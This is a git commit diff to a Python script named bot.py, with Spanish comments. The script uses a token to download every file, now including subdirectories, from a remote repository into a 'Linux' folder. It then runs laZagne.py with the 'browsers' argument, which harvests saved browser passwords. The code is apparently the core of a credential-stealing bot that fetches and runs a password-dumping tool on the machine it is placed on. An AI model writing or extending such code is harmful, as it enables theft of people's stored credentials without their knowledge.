af179f5c779fce80dc5adaf5bb8a25b6420d4a63
CyberMonkey <151052652+Pol-Ruiz@users.noreply.github.com>
2024-01-31 19:05:03 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -12,10 +12,16 @@ def downloadFile(urlb, token):
     if isinstance(res, list):  # Si la respuesta es una lista, significa que es un directorio
         for file_info in res:
             if file_info['type'] == 'file':  # Si es un archivo, lo descargamos
+                print('[!] Descargando archivo ' + file_info['name'])
                 download_url = file_info['download_url']
                 file_content = requests.get(download_url).content
                 with open(os.path.join('Linux', file_info['name']), 'wb') as f:
                     f.write(file_content)
+            elif file_info['type'] == 'dir':  # Si es un directorio, lo exploramos
+                print('[!] Explorando directorio ' + file_info['name'])
+                new_path = os.path.join('Linux', file_info['name'])
+                os.makedirs(new_path, exist_ok=True)
+                downloadFile(file_info['url'], token)
     else:
         print('[-] ' + res.get('message', 'Error desconocido'))
 
@@ -30,5 +36,6 @@ def run(token):
     downloadFile(urlb, token)
     
     # Ejecutar el archivo con el argumento "all"
+    print('[!] Ejecutando laZagne.py')
     subprocess.run(["python3", os.path.join('Linux', 'laZagne.py'), "browsers"], check=True)
 
